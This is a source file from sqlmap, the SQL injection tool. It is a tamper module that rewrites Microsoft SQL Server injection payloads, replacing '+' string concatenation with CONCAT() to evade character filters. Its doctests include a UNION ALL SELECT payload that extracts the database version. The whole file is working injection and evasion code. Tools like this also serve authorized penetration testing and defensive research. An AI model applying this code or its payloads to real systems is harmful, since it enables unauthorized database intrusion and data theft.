#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.common import zeroDepthSearch
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))

def tamper(payload, **kwargs):
    """
    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart

    Tested against:
        * Microsoft SQL Server 2012

    Requirements:
        * Microsoft SQL Server 2012+

    Notes:
        * Useful in case ('+') character is filtered

    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'

    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
    '1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'
    """

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            part = match.group(0)

            chars = [char for char in part]
            for index in zeroDepthSearch(part, '+'):
                chars[index] = ','

            replacement = "CONCAT(%s)" % "".join(chars)
            retVal = retVal.replace(part, replacement)

    return retVal
